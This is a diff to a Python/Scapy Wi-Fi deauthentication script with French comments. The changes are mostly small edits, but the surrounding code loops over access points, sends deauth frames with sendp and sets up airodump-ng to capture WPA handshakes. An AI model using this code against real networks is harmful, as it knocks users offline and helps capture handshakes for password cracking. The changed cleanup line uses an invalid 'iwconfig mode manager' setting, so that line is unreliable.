@@ -4,6 +4,7 @@ from scapy.layers import *
 from prettytable import PrettyTable
 import argparse
 import sys
+import subprocess
 
 """
 TODO
@@ -47,7 +48,7 @@ def main():
     args = parser.parse_args()
     #verif droit sudo 
     if not os.geteuid() == 0:
-        print(GREEN,f"[!] SUDO requied, please make a sudo command")
+        print(BOLD, RED,f"[!] SUDO requied, please make a sudo command")
         sys.exit()
     else:
         pass
@@ -110,7 +111,7 @@ display_wifi_networks(networks)
 
 
 #prise d'infos (client pour deauth)
-if bssid != False:
+if bssid_list:
     for mac in bssid_list: 
         
         #pas besoin d'avoir le MAC du client pour deauth...
@@ -124,8 +125,7 @@ if bssid != False:
 
             command = f"airodump-ng --bssid {mac} --channel {channel} {wlanmon}" # essaye de chopper le handshake
 
-            print(command)
-
+            
             sendp(packet, iface=interface, count=deauth_packets, inter=0.1, verbose=1)
 
             # BOOM wifi deauth
@@ -141,5 +141,5 @@ else:
 
 # kill monitor mode
 os.system(f"airmon-ng stop {interface} > /dev/null ")
-os.system(f"service NetworkManager restart")
+os.system(f"ifconfig wlan0 down && iwconfig wlan0 mode manager && ifconfig wlan0 up && service networking restart && service NetworkManager restart")
 
